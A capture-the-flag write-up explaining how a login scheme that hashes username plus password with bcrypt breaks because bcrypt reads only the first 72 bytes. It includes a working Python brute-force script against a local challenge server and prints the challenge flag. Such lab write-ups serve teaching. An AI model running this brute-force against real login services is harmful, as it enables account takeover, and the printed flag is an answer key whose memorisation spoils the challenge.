---
ai_date: '2025-04-27 05:26:15'
ai_summary: BCrypt vulnerability due to appending password to username, allowing brute
  forcing of a single byte.
ai_tags:
- bcrypt
- length-extension
- brute-force
created: 2025-03-02T07:48
points: 450
solves: 7
updated: 2025-03-18T02:31
---

The 'trick' used created a vulnerbility.

> higgsloitadmin: Instead of hashing the password only, we append it to the username and hash the result.

bcrypt only processes the first 72 bytes of its input, so if the username is long (let's say 71 bytes), we only have to brute force 1 byte of information.

```python
import string
import requests

target = "http://127.0.0.1:16605"


def try_login(username, password):
    return requests.post(target + "/api/login", json={"username": username, "password": password}).json()


user = "broootheeer.meee.iii.duuupliiicaaateee.myyy.voooweeels.threee.tiiimeees"
password = "a"*16
for c in string.ascii_lowercase+string.digits:
    print(f"Trying {c}")
    res = try_login(user, c*16)
    if res['success']:
        print(f"Found: {c}")
        password = c*16
        break

s = requests.Session()
s.post(target + "/api/login", json={"username": user, "password": password})

print(s.get(target + "/flag").text)
```

```flag
ATHACKCTF{tldr_BCrypt_i$_limit3d_to_72_8yt3s}
```